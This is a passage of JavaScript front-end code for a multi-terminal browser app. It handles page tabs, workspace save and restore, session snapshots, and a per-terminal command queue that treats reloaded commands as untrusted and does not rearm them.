  saveTerminalPages();
  saveSessionSnapshot();

  if (state.activeId === terminalId && !isOnActivePage(terminal)) {
    const remaining = terminalsOnActivePage();
    if (remaining.length > 0) setActiveTerminal(remaining[0].id);
  }
  applyZoom();
  updateTerminalActions();
  toast(`Moved to “${page.name}”`, "success", 1800);
}

function cyclePage(direction) {
  if (state.pages.length < 2) return;
  const index = state.pages.findIndex((page) => page.id === state.activePageId);
  const next = (index + direction + state.pages.length) % state.pages.length;
  setActivePage(state.pages[next].id);
}

const PAGER_PLACEMENTS = new Set(["top", "bottom", "left", "right"]);

function normalizedPagerPlacement(value = state.settings.pagerPlacement) {
  return PAGER_PLACEMENTS.has(value) ? value : "bottom";
}

function isVerticalPager() {
  const placement = normalizedPagerPlacement();
  return placement === "left" || placement === "right";
}

function applyPagerPlacement() {
  const placement = normalizedPagerPlacement();
  const vertical = placement === "left" || placement === "right";
  const collapsed = vertical && Boolean(state.settings.pagerCollapsed);
  state.settings.pagerPlacement = placement;
  elements.pagerPlacement.value = placement;
  elements.pagerPlacement._combo?.sync();

  document.body.dataset.pagerPlacement = placement;
  document.body.classList.toggle("pager-panel-collapsed", collapsed);
  elements.pager.setAttribute("aria-orientation", vertical ? "vertical" : "horizontal");

  if (vertical) {
    if (placement === "left") elements.workbench.insertBefore(elements.pager, elements.stage);
    else elements.workbench.append(elements.pager);
  } else if (placement === "top") {
    elements.appShell.insertBefore(elements.pager, elements.workbench);
  } else {
    elements.appShell.insertBefore(elements.pager, document.querySelector(".status-bar"));
  }

  placeHeaderRestoreToggle(placement);
  const edge = placement === "right" ? "right" : "left";
  elements.pagerCollapse.innerHTML = `<i data-lucide="panel-${edge}-close"></i>`;
  elements.togglePager.innerHTML = `<i data-lucide="panel-${edge}-open"></i>`;
  elements.pager.setAttribute("aria-hidden", String(collapsed));
  elements.pagerCollapse.setAttribute("aria-expanded", String(!collapsed));
  elements.togglePager.setAttribute("aria-expanded", String(!collapsed));
  refreshIcons(elements.pager);
  refreshIcons(elements.togglePager);
  window.requestAnimationFrame(() => fitAllTerminals());
}

function placeHeaderRestoreToggle(placement) {
  if (state.settings.headerHidden && placement === "top") {
    elements.pagerAdd.after(elements.toggleHeader);
    return;
  }
  elements.chromeControls.append(elements.toggleHeader);
}

function setPagerPlacement(placement) {
  const next = normalizedPagerPlacement(placement);
  state.settings.pagerPlacement = next;
  state.settings.pagerCollapsed = false;
  saveSettings();
  applyPagerPlacement();
  toast(`Pages moved to the ${next}`, "info", 1600);
}

function togglePagerPanel() {
  if (!isVerticalPager()) return;
  state.settings.pagerCollapsed = !state.settings.pagerCollapsed;
  saveSettings();
  applyPagerPlacement();
}

function showPagerPlacementMenu(x, y) {
  const current = normalizedPagerPlacement();
  renderContextMenu([
    { label: "Open new page", icon: "plus", run: () => addPage() },
    { separator: true },
    { label: "Move pages to top", icon: "panel-top", disabled: current === "top", run: () => setPagerPlacement("top") },
    { label: "Move pages to bottom", icon: "panel-bottom", disabled: current === "bottom", run: () => setPagerPlacement("bottom") },
    { separator: true },
    { label: "Move pages to left", icon: "panel-left", disabled: current === "left", run: () => setPagerPlacement("left") },
    { label: "Move pages to right", icon: "panel-right", disabled: current === "right", run: () => setPagerPlacement("right") }
  ]);
  showBuiltContextMenu(x, y);
}

let draggedPageId = null;
let pageDragChanged = false;
let pageDropAccepted = false;
let originalPageOrder = null;
let suppressPageClick = false;

function syncPageOrderFromPager() {
  const pagesById = new Map(state.pages.map((page) => [page.id, page]));
  const reordered = [...elements.pagerList.querySelectorAll(".pager-chip")]
    .map((chip) => pagesById.get(chip.dataset.pageId))
    .filter(Boolean);
  if (reordered.length === state.pages.length) state.pages = reordered;
}

function moveDraggedPage(targetChip, before) {
  const draggedChip = elements.pagerList.querySelector(`[data-page-id="${CSS.escape(draggedPageId)}"]`);
  if (!draggedChip || draggedChip === targetChip) return;

  const alreadyPlaced = before
    ? targetChip.previousElementSibling === draggedChip
    : targetChip.nextElementSibling === draggedChip;
  if (alreadyPlaced) return;

  elements.pagerList.insertBefore(draggedChip, before ? targetChip : targetChip.nextElementSibling);
  syncPageOrderFromPager();
  pageDragChanged = true;
}

function movePageByOffset(pageId, offset) {
  const index = state.pages.findIndex((page) => page.id === pageId);
  const next = Math.max(0, Math.min(state.pages.length - 1, index + offset));
  if (index < 0 || next === index) return false;

  const [moved] = state.pages.splice(index, 1);
  state.pages.splice(next, 0, moved);
  savePages();
  renderPager();
  elements.pagerList.querySelector(`[data-page-id="${CSS.escape(pageId)}"]`)?.focus();
  toast(`Moved ${moved.name} to position ${next + 1}`, "info", 1400);
  return true;
}

function renderPager() {
  if (deferDuringBatch("renderPager")) return;
  const list = elements.pagerList;
  if (!list) return;

  list.textContent = "";
  for (const page of state.pages) {
    const onPage = terminalsOnPage(page.id);
    const count = onPage.length;
    const parked = onPage.filter((terminal) => terminal.minimized).length;
    const chip = document.createElement("button");
    chip.type = "button";
    chip.className = "pager-chip";
    chip.dataset.pageId = page.id;
    chip.draggable = true;
    chip.setAttribute("role", "tab");
    const isActive = page.id === state.activePageId;
    chip.classList.toggle("is-active", isActive);
    chip.setAttribute("aria-selected", isActive ? "true" : "false");
    chip.title = `${page.name} — ${count} terminal${count === 1 ? "" : "s"}${parked ? `, ${parked} minimized` : ""} (drop a terminal here; drag the tab to reorder; double-click or right-click to rename)`;

    const label = document.createElement("span");
    label.className = "pager-name";
    label.textContent = page.name;
    chip.append(label);

    const edit = document.createElement("span");
    edit.className = "pager-edit";
    edit.dataset.pageEdit = page.id;
    edit.setAttribute("role", "button");
    edit.setAttribute("aria-label", `Rename ${page.name}`);
    edit.title = "Rename page";
    edit.innerHTML = '<i data-lucide="pencil"></i>';
    chip.append(edit);

    const badge = document.createElement("span");
    badge.className = "pager-count";
    badge.textContent = String(count);
    chip.append(badge);

    // A page can hold minimized terminals you cannot see from another page, so flag
    // them on the tab. This is the "reach" affordance for the per-page dock scope.
    if (parked) {
      const park = document.createElement("span");
      park.className = "pager-parked";
      park.setAttribute("aria-label", `${parked} minimized`);
      park.title = `${parked} minimized terminal${parked === 1 ? "" : "s"}`;
      park.innerHTML = '<i data-lucide="minimize-2"></i><span class="pager-parked-count"></span>';
      park.querySelector(".pager-parked-count").textContent = String(parked);
      chip.append(park);
    }

    const canClose = state.pages.length > 1;
    const close = document.createElement("span");
    close.className = `pager-close${canClose ? "" : " is-disabled"}`;
    close.dataset.pageClose = page.id;
    close.setAttribute("role", "button");
    close.setAttribute("aria-disabled", String(!canClose));
    close.setAttribute("aria-label", canClose ? "Close page" : "The last page cannot be closed");
    close.title = canClose ? "Close page" : "The last page cannot be closed";
    close.textContent = "\u00d7";
    chip.append(close);

    list.append(chip);
  }
  refreshIcons();
}

// Renames in place so the chip does not jump around while you type.
function startPageRename(chip) {
  const page = pageById(chip.dataset.pageId);
  const label = chip.querySelector(".pager-name");
  if (!page || !label || chip.querySelector(".pager-rename")) return;

  const input = document.createElement("input");
  input.className = "pager-rename";
  input.type = "text";
  input.value = page.name;
  input.spellcheck = false;
  label.replaceWith(input);
  input.focus();
  input.select();

  let settled = false;
  const finish = (commit) => {
    if (settled) return;
    settled = true;
    if (commit) renamePage(page.id, input.value);
    renderPager();
  };
  input.addEventListener("keydown", (event) => {
    event.stopPropagation();
    if (event.key === "Enter") {
      event.preventDefault();
      finish(true);
    } else if (event.key === "Escape") {
      event.preventDefault();
      finish(false);
    }
  });
  input.addEventListener("blur", () => finish(true));
}

function bindPager() {
  const list = elements.pagerList;
  if (!list) return;

  list.addEventListener("click", (event) => {
    if (suppressPageClick) {
      event.preventDefault();
      return;
    }
    const edit = event.target.closest("[data-page-edit]");
    if (edit) {
      event.stopPropagation();
      startPageRename(edit.closest(".pager-chip"));
      return;
    }
    const close = event.target.closest("[data-page-close]");
    if (close) {
      event.stopPropagation();
      if (close.getAttribute("aria-disabled") === "true") return;
      requestPageClose(close.dataset.pageClose);
      return;
    }
    const chip = event.target.closest(".pager-chip");
    if (chip && !chip.querySelector(".pager-rename")) setActivePage(chip.dataset.pageId);
  });

  list.addEventListener("dblclick", (event) => {
    const chip = event.target.closest(".pager-chip");
    if (chip) startPageRename(chip);
  });

  list.addEventListener("keydown", (event) => {
    if (!event.ctrlKey || !event.shiftKey || event.target.closest(".pager-rename")) return;
    const chip = event.target.closest(".pager-chip");
    if (!chip) return;
    const previousKey = isVerticalPager() ? "ArrowUp" : "ArrowLeft";
    const nextKey = isVerticalPager() ? "ArrowDown" : "ArrowRight";
    const offset = event.key === previousKey ? -1 : event.key === nextKey ? 1 : 0;
    if (!offset) return;
    event.preventDefault();
    event.stopPropagation();
    movePageByOffset(chip.dataset.pageId, offset);
  });

  list.addEventListener("dragstart", (event) => {
    const chip = event.target.closest(".pager-chip");
    if (!chip || event.target.closest("[data-page-close], .pager-rename")) {
      event.preventDefault();
      return;
    }
    draggedPageId = chip.dataset.pageId;
    pageDragChanged = false;
    pageDropAccepted = false;
    originalPageOrder = state.pages.map((page) => page.id);
    suppressPageClick = true;
    chip.classList.add("is-page-dragging");
    if (event.dataTransfer) {
      event.dataTransfer.effectAllowed = "move";
      event.dataTransfer.setData("text/plain", draggedPageId);
    }
  });

  list.addEventListener("dragover", (event) => {
    if (!draggedPageId) return;
    event.preventDefault();
    if (event.dataTransfer) event.dataTransfer.dropEffect = "move";
    const targetChip = event.target.closest(".pager-chip");
    if (targetChip) {
      const rect = targetChip.getBoundingClientRect();
      const before = isVerticalPager()
        ? event.clientY < rect.top + rect.height / 2
        : event.clientX < rect.left + rect.width / 2;
      moveDraggedPage(targetChip, before);
    } else if (event.target === list || event.target.closest(".pager-list") === list) {
      const draggedChip = list.querySelector(`[data-page-id="${CSS.escape(draggedPageId)}"]`);
      if (draggedChip && draggedChip !== list.lastElementChild) {
        list.append(draggedChip);
        syncPageOrderFromPager();
        pageDragChanged = true;
      }
    }
  });

  list.addEventListener("drop", (event) => {
    if (!draggedPageId) return;
    event.preventDefault();
    pageDropAccepted = true;
  });

  list.addEventListener("dragend", (event) => {
    event.target.closest(".pager-chip")?.classList.remove("is-page-dragging");
    if (pageDragChanged && pageDropAccepted) {
      savePages();
    } else if (pageDragChanged && originalPageOrder) {
      const pagesById = new Map(state.pages.map((page) => [page.id, page]));
      state.pages = originalPageOrder.map((id) => pagesById.get(id)).filter(Boolean);
      renderPager();
    }
    draggedPageId = null;
    pageDragChanged = false;
    pageDropAccepted = false;
    originalPageOrder = null;
    window.setTimeout(() => { suppressPageClick = false; }, 0);
  });

  elements.pager.addEventListener("contextmenu", (event) => {
    const chip = event.target.closest(".pager-chip");
    event.preventDefault();
    if (!chip) {
      if (!event.target.closest("button")) showPagerPlacementMenu(event.clientX, event.clientY);
      return;
    }
    const page = pageById(chip.dataset.pageId);
    if (!page) return;
    const items = [
      { label: "Rename\u2026", icon: "pencil", run: () => startPageRename(chip) },
      { label: "New page", icon: "plus", run: () => addPage() }
    ];
    items.push({ separator: true });
    if (state.pages.length > 1) {
      items.push({ label: "Close page", icon: "x", danger: true, run: () => requestPageClose(page.id) });
    }
    items.push({ label: "Close all", icon: "trash-2", danger: true, run: requestCloseAllPages });
    renderContextMenu(items);
    showBuiltContextMenu(event.clientX, event.clientY);
  });

  elements.pagerAdd?.addEventListener("click", () => addPage());
  elements.pagerCollapse?.addEventListener("click", togglePagerPanel);
  elements.togglePager?.addEventListener("click", togglePagerPanel);
}

/* ---------------- Workspaces --------------- */

function loadWorkspaces() {
  try {
    return JSON.parse(localStorage.getItem("multiterm.workspaces") || "{}");
  } catch {
    return {};
  }
}

function saveWorkspaces() {
  localStorage.setItem("multiterm.workspaces", JSON.stringify(state.workspaces));
}

function refreshWorkspaceSelect(selected) {
  const names = Object.keys(state.workspaces).sort((a, b) => a.localeCompare(b));
  elements.workspaceSelect.innerHTML = "";

  if (names.length === 0) {
    const option = document.createElement("option");
    option.value = "";
    option.textContent = "No saved workspaces";
    option.disabled = true;
    option.selected = true;
    elements.workspaceSelect.append(option);
    invalidateSettingsSearchItem(elements.workspaceSelect);
    return;
  }

  for (const name of names) {
    const option = document.createElement("option");
    option.value = name;
    option.textContent = name;
    elements.workspaceSelect.append(option);
  }
  if (selected && state.workspaces[selected]) {
    elements.workspaceSelect.value = selected;
  }
  refreshComboboxes();
  invalidateSettingsSearchItem(elements.workspaceSelect);
}

function saveWorkspace(rawName) {
  const name = String(rawName || "").trim();
  if (!name) {
    toast("Enter a workspace name", "info", 1800);
    elements.workspaceName.focus();
    return;
  }

  state.workspaces[name] = {
    savedAt: new Date().toISOString(),
    settings: { ...state.settings },
    pages: state.pages.map((page) => ({ id: page.id, name: page.name })),
    activePageId: state.activePageId,
    terminals: [...state.terminals.values()].map((terminal) => ({
      title: terminal.titleInput.value,
      shell: terminal.shell,
      cwd: terminal.cwd,
      copilotCwd: terminal.copilotCwd,
      color: terminal.color,
      fontSizeOverride: terminal.fontSizeOverride,
      headerActionOverrides: { ...terminal.headerActionOverrides },
      notificationOverrides: { ...terminal.notificationOverrides },
      pageId: terminal.pageId
    }))
  };
  saveWorkspaces();
  refreshWorkspaceSelect(name);
  elements.workspaceName.value = "";
  log.info("workspace", `Saved workspace “${name}”`, { terminals: state.terminals.size, pages: state.pages.length });
  toast(`Saved workspace “${name}”`, "success");
}

function restoreWorkspace(name) {
  const workspace = name && state.workspaces[name];
  if (!workspace) {
    toast("Select a workspace first", "info", 1800);
    return;
  }

  state.settings = { ...defaultSettings, ...workspace.settings };
  state.settings.headerActionDragScope = normalizeHeaderActionDragScope(state.settings.headerActionDragScope);
  state.settings.headerActionsInMenu = normalizeHeaderActionsInMenu(state.settings.headerActionsInMenu);
  state.settings.pageCloseAction = normalizePageCloseAction(state.settings.pageCloseAction);
  state.settings.titleFontScale = normalizeTitleFontScale(state.settings.titleFontScale);
  state.settings.workspaceZoom = normalizeWorkspaceZoom(state.settings.workspaceZoom);
  syncControlsFromSettings();
  clearSnapLayout(false);
  applySettings();
  sendBridgeConfig();
  saveSettings();

  for (const terminal of [...state.terminals.values()]) {
    disposeTerminal(terminal);
  }
  state.activeId = null;
  state.primaryId = null;

  // Workspaces saved before pages existed carry a flat terminal list; treat that
  // as a single page so old saves keep restoring.
  const savedPages = Array.isArray(workspace.pages) && workspace.pages.length > 0
    ? workspace.pages
        .filter((page) => page && typeof page.id === "string" && page.id)
        .map((page) => ({ id: page.id, name: String(page.name || "Page") }))
    : [];
  state.pages = savedPages.length > 0 ? savedPages : defaultPages();
  state.activePageId = state.pages.some((page) => page.id === workspace.activePageId)
    ? workspace.activePageId
    : state.pages[0].id;
  state.terminalPages = {};
  savePages();
  renderPager();

  const list = Array.isArray(workspace.terminals) && workspace.terminals.length > 0
    ? workspace.terminals
    : [{ title: "PowerShell 7", shell: "pwsh" }];
  batchTerminalWork(() => {
    for (const meta of list) {
      addTerminal({
        title: meta.title,
        shell: meta.shell,
        cwd: meta.cwd,
        copilotCwd: meta.copilotCwd,
        color: meta.color,
        fontSizeOverride: meta.fontSizeOverride,
        headerActionOverrides: meta.headerActionOverrides,
        notificationOverrides: meta.notificationOverrides,
        pageId: meta.pageId
      });
    }
  });
  applyPageVisibility();
  renderPager();
  updateTerminalActions();
  log.info("workspace", `Restored workspace “${name}”`, { terminals: list.length, pages: state.pages.length });
  toast(`Restored “${name}”`, "success");
}

function deleteWorkspace(name) {
  if (!name || !state.workspaces[name]) {
    toast("Select a workspace first", "info", 1800);
    return;
  }
  delete state.workspaces[name];
  saveWorkspaces();
  refreshWorkspaceSelect();
  log.info("workspace", `Deleted workspace “${name}”`);
  toast(`Deleted “${name}”`, "info");
}

function syncControlsFromSettings() {
  elements.layoutMode.value = state.settings.layout;
  elements.pagerPlacement.value = normalizedPagerPlacement();
  elements.minWidth.value = state.settings.minWidth;
  elements.columnCount.value = state.settings.columns;
  elements.rowCount.value = state.settings.rows;
  elements.paneHeight.value = state.settings.paneHeight;
  elements.focusWidth.value = state.settings.focusWidth;
  elements.paneGap.value = state.settings.gap;
  elements.workspaceZoom.value = state.settings.workspaceZoom;
  elements.statusWorkspaceZoom.value = state.settings.workspaceZoom;
  elements.fontSize.value = state.settings.fontSize;
  elements.titleFontScale.value = state.settings.titleFontScale;
  elements.terminalTheme.value = state.settings.theme;
  elements.appTheme.value = state.settings.appTheme;
  elements.fontFamily.value = state.settings.fontFamily;
  elements.headerActionDragScope.value = normalizeHeaderActionDragScope(state.settings.headerActionDragScope);
  elements.cursorStyle.value = state.settings.cursorStyle;
  elements.cursorBlink.checked = state.settings.cursorBlink;
  elements.compactChrome.checked = state.settings.compactChrome;
  elements.syncInput.checked = state.settings.syncInput;
  elements.ctrlVPaste.checked = state.settings.ctrlVPaste;
  elements.cleanCopilotClipboard.checked = state.settings.cleanCopilotClipboard;
  state.settings.copilotImportContextKb = clampCopilotImportContextKb(
    state.settings.copilotImportContextKb,
    elements.copilotImportContextKb
  );
  elements.keepSessionsOnClose.checked = state.settings.keepSessionsOnClose;
  elements.restoreSession.checked = state.settings.restoreSession;
  elements.bellNotify.checked = state.settings.bellNotify;
  elements.copyOnSelect.checked = state.settings.copyOnSelect;
  elements.highlightInputPrompts.checked = state.settings.highlightInputPrompts;
  elements.rightClickAction.value = state.settings.rightClickAction;
  elements.scrollbackLines.value = state.settings.scrollback;
  elements.scrollbackInfinite.checked = state.settings.scrollbackInfinite;
  elements.scrollOnOutput.checked = state.settings.scrollOnOutput;
  elements.outputCoalesceMs.value = state.settings.outputCoalesceMs;
  elements.outputBacklogKb.value = state.settings.outputBacklogKb;
  elements.pageCloseAction.value = normalizePageCloseAction(state.settings.pageCloseAction);
  elements.terminalMessageMaxKb.value = state.settings.terminalMessageMaxKb;
  elements.terminalInboxCapacity.value = state.settings.terminalInboxCapacity;
  state.settings.maxInstallerSizeMb = normalizeInstallerSizeMb(
    state.settings.maxInstallerSizeMb,
    elements.maxInstallerSizeMb
  );
  elements.notifyActivity.checked = state.settings.notifyActivity;
  elements.notifySilence.checked = state.settings.notifySilence;
  elements.silenceSeconds.value = state.settings.silenceSeconds;
  elements.startupCommand.value = state.settings.startupCommand;
  syncAutomaticUpdateControls();
  renderSnippets();
  updateBroadcastEnterToggle();
  refreshComboboxes();
}

/* ---------------- Per-terminal color labels --------------- */

function applyPaneColor(terminal) {
  if (terminal.color) {
    terminal.pane.style.setProperty("--pane-accent", terminal.color);
    terminal.pane.classList.add("has-color");
  } else {
    terminal.pane.style.removeProperty("--pane-accent");
    terminal.pane.classList.remove("has-color");
  }
}

function cyclePaneColor(terminal) {
  const current = terminal.color ? PANE_COLORS.indexOf(terminal.color) : -1;
  const nextIndex = current + 1;
  terminal.color = nextIndex >= PANE_COLORS.length ? null : PANE_COLORS[nextIndex];
  applyPaneColor(terminal);
  saveSessionSnapshot();
}

/* ---------------- Bell notifications --------------- */

function handleBell(terminal) {
  if (!terminalNotificationEnabled(terminal, "bell")) return;

  const name = terminal.titleInput.value || "Terminal";
  if (terminal.id !== state.activeId || document.hidden) {
    markActivity(terminal, true);
    notifyDesktop(`Bell in ${name}`, terminal);
  }
}

/* ---------------- Session snapshot (auto-restore) --------------- */

function saveSessionSnapshot() {
  if (deferDuringBatch("saveSessionSnapshot")) return;
  const snapshot = [...state.terminals.values()].map((terminal) => ({
    id: terminal.id,
    title: terminal.titleInput.value,
    shell: terminal.shell,
    cwd: terminal.cwd,
    copilotCwd: terminal.copilotCwd,
    color: terminal.color,
    fontSizeOverride: terminal.fontSizeOverride,
    headerActionOverrides: { ...terminal.headerActionOverrides },
    notificationOverrides: { ...terminal.notificationOverrides },
    minimized: terminal.minimized,
    pageId: terminal.pageId,
    tmux: terminal.tmux
  }));
  localStorage.setItem("multiterm.lastSession", JSON.stringify(snapshot));
  // The snapshot carries no ids, so it cannot restore an arrangement when the
  // bridge still has the sessions alive and we reattach instead of recreating.
  // Keep the id order alongside it for that path.
  localStorage.setItem("multiterm.paneOrder", JSON.stringify([...state.terminals.keys()]));
}

function loadPaneOrder() {
  try {
    const value = JSON.parse(localStorage.getItem("multiterm.paneOrder") || "[]");
    return Array.isArray(value) ? value : [];
  } catch {
    return [];
  }
}

// Sessions arrive from the bridge in creation order, which throws away any
// rearranging the user did. Reapply the saved order; anything the saved order
// does not know about (created elsewhere, or since this tab last wrote) keeps its
// relative bridge order at the end.
function orderSessionsBySavedArrangement(sessions) {
  const saved = loadPaneOrder();
  if (saved.length === 0) return sessions;

  const rank = new Map(saved.map((id, index) => [id, index]));
  return [...sessions]
    .map((session, index) => ({ session, index, rank: rank.get(session.id) ?? Infinity }))
    .sort((a, b) => a.rank - b.rank || a.index - b.index)
    .map((entry) => entry.session);
}

function loadSessionSnapshot() {
  try {
    const value = JSON.parse(localStorage.getItem("multiterm.lastSession") || "[]");
    return Array.isArray(value) ? value : [];
  } catch {
    return [];
  }
}

/* ---------------- Terminal notes and command queue --------------- */

const UNPARENTED_QUEUE_VALUE = "__unparented__";

function emptyTerminalArtifacts() {
  return {
    version: 1,
    terminals: {},
    recoveredNotes: [],
    unparentedQueue: []
  };
}

function normalizeArtifactPid(value) {
  const pid = Number(value);
  return Number.isInteger(pid) && pid > 0 ? pid : null;
}

// Queue entries are replayed straight into a shell, so what comes back out of
// localStorage is treated as untrusted input rather than as our own data: it may
// have been written by a tampered profile, a synced settings file, or an older
// build with weaker filtering.
function normalizeQueueItem(item, index, prefix) {
  if (!item || typeof item !== "object") return null;
  const command = typeof item.command === "string" ? safeTerminalCommand(item.command) : null;
  if (!command) return null;
  return {
    ...item,
    id: typeof item.id === "string" && item.id ? item.id : `${prefix}-${index}-${Date.now()}`,
    command,
    createdAt: typeof item.createdAt === "string" ? item.createdAt : new Date().toISOString(),
    occurrenceKey: typeof item.occurrenceKey === "string" ? item.occurrenceKey.slice(0, 320) : "",
    // Automatic execution is intentionally runtime-only. Persisted profile data
    // is untrusted and must never arm a command after reload without a fresh click.
    runWhenReady: false
  };
}

function loadTerminalArtifacts() {
  const empty = emptyTerminalArtifacts();
  try {
    const parsed = JSON.parse(localStorage.getItem(TERMINAL_ARTIFACTS_STORAGE_KEY) || "null");
    if (!parsed || typeof parsed !== "object") return empty;

    const terminals = {};
    for (const [id, raw] of Object.entries(parsed.terminals || {})) {
      if (!raw || typeof raw !== "object") continue;
      terminals[id] = {
        terminalId: id,
        pid: normalizeArtifactPid(raw.pid),
        startedAt: typeof raw.startedAt === "string" ? raw.startedAt : null,
        title: typeof raw.title === "string" ? raw.title : "Terminal",
        shell: typeof raw.shell === "string" ? raw.shell : "",
        cwd: typeof raw.cwd === "string" ? raw.cwd : "",
        notes: typeof raw.notes === "string" ? raw.notes : "",
        notesUpdatedAt: typeof raw.notesUpdatedAt === "string" ? raw.notesUpdatedAt : null,
        queue: (Array.isArray(raw.queue) ? raw.queue : [])
          .map((item, index) => normalizeQueueItem(item, index, `queue-${id}`))
          .filter(Boolean)
      };
    }

    return {
      version: 1,
      terminals,
      recoveredNotes: (Array.isArray(parsed.recoveredNotes) ? parsed.recoveredNotes : [])
        .filter((entry) => entry && typeof entry === "object" && typeof entry.notes === "string")
        .map((entry, index) => ({
          ...entry,
          id: typeof entry.id === "string" && entry.id ? entry.id : `recovered-${index}-${Date.now()}`,
          pid: normalizeArtifactPid(entry.pid)
        })),
      unparentedQueue: (Array.isArray(parsed.unparentedQueue) ? parsed.unparentedQueue : [])
        .map((item, index) => normalizeQueueItem(item, index, "unparented"))
        .filter(Boolean)
    };
  } catch (error) {
    console.warn("[MT:artifacts] Could not load terminal notes and queue", error);
    return empty;
  }
}

function saveTerminalArtifacts() {
  localStorage.setItem(TERMINAL_ARTIFACTS_STORAGE_KEY, JSON.stringify(state.terminalArtifacts));
  updateTerminalArtifactIndicators();
}

function terminalArtifactMetadata(terminal) {
  return {
    terminalId: terminal.id,
    pid: normalizeArtifactPid(terminal.pid),
    startedAt: terminal.startedAt || null,
    title: terminal.titleInput.value || "Terminal",
    shell: terminal.shell || "",
    cwd: terminal.cwd || ""
  };
}

function ensureTerminalArtifact(terminal) {
  let record = state.terminalArtifacts.terminals[terminal.id];
  if (!record) {
    record = {
      ...terminalArtifactMetadata(terminal),
      notes: "",
      notesUpdatedAt: null,
      queue: []
    };
    state.terminalArtifacts.terminals[terminal.id] = record;
  } else {
    Object.assign(record, terminalArtifactMetadata(terminal));
  }
  return record;
}

function setPaneQuickQueueOpen(terminal, open) {
  const button = terminal.pane.querySelector(".pane-queue-add");
  const form = terminal.pane.querySelector(".pane-quick-queue");
  const input = form?.querySelector(".pane-quick-queue-input");
  if (!button || !form || !input) return;
  const next = Boolean(open);
  form.hidden = !next;
  button.classList.toggle("is-open", next);
  button.setAttribute("aria-expanded", String(next));
  if (next) {
    input.focus({ preventScroll: true });
    input.select();
  } else {
    input.value = "";
  }
}

function bindPaneQuickQueue(terminal) {
  const button = terminal.pane.querySelector(".pane-queue-add");
  const form = terminal.pane.querySelector(".pane-quick-queue");
  const input = form?.querySelector(".pane-quick-queue-input");
  const cancel = form?.querySelector("[data-quick-queue-cancel]");
  if (!button || !form || !input || !cancel) return;

  button.addEventListener("click", () => {
    setActiveTerminal(terminal.id);
    setPaneQuickQueueOpen(terminal, form.hidden);
  });
  form.addEventListener("pointerdown", (event) => event.stopPropagation());
  form.addEventListener("submit", (event) => {
    event.preventDefault();
    event.stopPropagation();
    if (queueAutomaticTerminalCommand(terminal, input.value)) {
      setPaneQuickQueueOpen(terminal, false);
      terminal.term.focus();
    }
  });
  cancel.addEventListener("click", () => {
    setPaneQuickQueueOpen(terminal, false);
    terminal.term.focus();
  });
  input.addEventListener("keydown", (event) => {
    if (event.key !== "Escape") return;
    event.preventDefault();
    setPaneQuickQueueOpen(terminal, false);
    terminal.term.focus();
  });
}

function queueAutomaticTerminalCommand(terminal, rawCommand, options = {}) {
  if (!artifactTerminalIsAvailable(terminal)) {
    toast("That terminal is no longer available.", "error", 2200);
    return false;
  }
  const command = safeTerminalCommand(rawCommand);
  if (!command) {
    toast(
      sanitizeTerminalCommand(rawCommand)
        ? `Commands are limited to ${MAX_TERMINAL_COMMAND_LENGTH} characters.`
        : "Enter a command or Copilot prompt to queue.",
      "info",
      2000
    );
    return false;
  }

  const queue = ensureTerminalArtifact(terminal).queue;
  const occurrenceKey = typeof options.occurrenceKey === "string" ? options.occurrenceKey.slice(0, 320) : "";
  const existing = occurrenceKey ? queue.find((item) => item.occurrenceKey === occurrenceKey) : null;
  if (existing) {
    existing.runWhenReady = true;
    saveTerminalArtifacts();
    scheduleAutomaticQueueCheck(terminal, 150);
    return true;
  }
  queue.push({
    id: createId(),
    command,
    createdAt: new Date().toISOString(),
    occurrenceKey,
    runWhenReady: true
  });
  saveTerminalArtifacts();
  scheduleAutomaticQueueCheck(terminal, 150);
  toast(`Queued for ${terminal.titleInput.value || "terminal"}`, "success", 1600);
  return true;
}

function archiveArtifactRecord(record, reason) {
  if (!record) return false;
  const recoveredAt = new Date().toISOString();
  const source = {
    sourceTerminalId: record.terminalId,
    pid: normalizeArtifactPid(record.pid),
    startedAt: record.startedAt || null,
    title: record.title || "Terminal",
    shell: record.shell || "",
    cwd: record.cwd || "",
    recoveredAt,
    reason
  };
  let changed = false;

  if (String(record.notes || "").trim()) {
    state.terminalArtifacts.recoveredNotes.unshift({
      id: createId(),
      notes: record.notes,
      notesUpdatedAt: record.notesUpdatedAt || recoveredAt,
      ...source
    });
    changed = true;
  }

  if (Array.isArray(record.queue) && record.queue.length > 0) {
    state.terminalArtifacts.unparentedQueue.push(
      ...record.queue.map((item) => ({ ...item, runWhenReady: false, ...source, unparentedAt: recoveredAt }))
    );
    changed = true;
  }
  return changed;
}

function syncTerminalArtifacts(terminal) {
  const record = state.terminalArtifacts.terminals[terminal.id];
  if (!record) {
    updateTerminalArtifactIndicators();
    return;
  }

  const oldPid = normalizeArtifactPid(record.pid);
  const nextPid = normalizeArtifactPid(terminal.pid);
  if (oldPid && nextPid && oldPid !== nextPid) {
    archiveArtifactRecord(record, "terminal ID was reused by a new process");
    delete state.terminalArtifacts.terminals[terminal.id];
    saveTerminalArtifacts();
    return;
  }

  Object.assign(record, terminalArtifactMetadata(terminal));
  saveTerminalArtifacts();
}

function orphanTerminalArtifacts(terminal, reason) {
  const record = state.terminalArtifacts.terminals[terminal.id];
  if (!record) {
    updateTerminalArtifactIndicators();
    return false;
  }

  Object.assign(record, terminalArtifactMetadata(terminal));
  archiveArtifactRecord(record, reason);
  delete state.terminalArtifacts.terminals[terminal.id];
  saveTerminalArtifacts();
  log.info("artifacts", `Recovered notes and queue from ${record.title}`, {
    id: terminal.id,
    pid: record.pid,
    reason
  });

  if (elements.terminalArtifactsOverlay && !elements.terminalArtifactsOverlay.hidden) {
    refreshTerminalArtifactTargets(UNPARENTED_QUEUE_VALUE);
    renderTerminalArtifacts();
  }
  return true;
}

function recoverAllTerminalArtifacts(reason) {
  let changed = false;
  for (const record of Object.values(state.terminalArtifacts.terminals)) {
    archiveArtifactRecord(record, reason);
    delete state.terminalArtifacts.terminals[record.terminalId];
    changed = true;
  }
  if (changed) saveTerminalArtifacts();
}

function recoverStaleTerminalArtifacts(liveSessionIds) {
  let changed = false;
  for (const [id, record] of Object.entries(state.terminalArtifacts.terminals)) {
    if (liveSessionIds.has(id) || state.terminals.has(id)) continue;
    archiveArtifactRecord(record, "terminal process is no longer available");
    delete state.terminalArtifacts.terminals[id];
    changed = true;
  }
  if (changed) saveTerminalArtifacts();
}

function artifactTerminalIsAvailable(terminal) {
  return Boolean(terminal) && terminal.status !== "exited" && terminal.status !== "error";
}

function liveArtifactTerminals() {
  return [...state.terminals.values()].filter(artifactTerminalIsAvailable);
}

function updateTerminalArtifactIndicators() {
  const activeQueueCount = Object.values(state.terminalArtifacts.terminals)
